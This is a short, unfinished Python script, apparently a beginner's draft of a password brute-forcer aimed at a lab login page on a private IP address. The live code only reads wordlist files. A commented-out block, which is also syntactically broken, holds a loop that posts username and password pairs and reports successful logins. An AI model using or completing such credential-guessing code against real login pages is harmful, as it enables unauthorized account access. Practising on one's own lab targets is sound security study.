#!/usr/bin/python
import requests

#username=admin&password=password&Login=Login
url = "http://192.168.43.192/login.php"

def username():
	 with open('usr.txt','r') as user:
		for usr in user:
			return usr


def password():
	 with open('pass.txt','r') as password:
		for passwd in password:
			return passwd.strip('\n') 
def userpasswd():
	username()
	#print (s)
	password()

'''
def login():
	with open('usr.txt','r') as user:
		with open('pass.txt','r') as password:
			for usr in user:
				for passwd in password:
					pass
					#print (usr.strip('\n')+":"+passwd.strip('\n'))
				#print (usr.strip('\n'))
				print (usr.strip('\n')+":"+passwd.strip('\n'))

					data = {'username':usr,'password':passwd,'Login':'Login'}
					response = requests.post(url=url,data=data)
					if 'Login failed' in response.content:
						print ("Trying :" +usr+":"+passwd)
					else:
						print ("Username:"+usr+"Password:"+passwd)
'''
#userpasswd()

print(username())

